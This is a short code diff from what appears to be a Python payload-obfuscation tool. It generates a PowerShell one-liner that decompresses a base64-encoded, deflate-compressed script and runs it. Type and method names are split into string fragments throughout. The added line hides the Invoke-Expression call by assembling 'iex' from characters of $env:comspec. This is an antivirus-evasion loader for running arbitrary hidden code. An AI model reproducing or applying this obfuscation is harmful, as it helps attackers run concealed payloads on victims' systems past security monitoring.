@@ -87,7 +87,7 @@ if os.path.exists(args.file):
         	compressed_string = zlibbed_str[2:-4]
 
         	# Format and use base64 to use it in PowerShell
-        	powershell_command = """$c ="Defla" + "teStream";$b = "Compre" + "ssion"; $a ="Strea" + "mReader"; .("i"+"ex") $(New-Object IO.$a ($(New-Object IO.$b.$c ($(New-Object IO.MemoryStream(,$([Convert]::("FromB" +"ase6" + "4String")("{}")))), [IO.Compression.CompressionMode]::("De" +"compress"))), [Text.Encoding]::ASCII)).ReadToEnd();"""
+        	powershell_command = """$env = $env:comspec; $c ="Defla" + "teStream"; $b = "Compre" + "ssion"; $a ="Strea" + "mReader"; $f =  $(New-Object IO.$a ($(New-Object IO.$b.$c ($(New-Object IO.MemoryStream(,$([Convert]::("FromB" +"ase6" + "4String")("{}")))), [IO.Compression.CompressionMode]::("De" +"compress"))), [Text.Encoding]::ASCII)).ReadToEnd(); .($env[4,24,25]-join'') $f"""
         	powershell_command = powershell_command.format(base64.b64encode(compressed_string).decode('ascii'))
         
     except Exception as err:
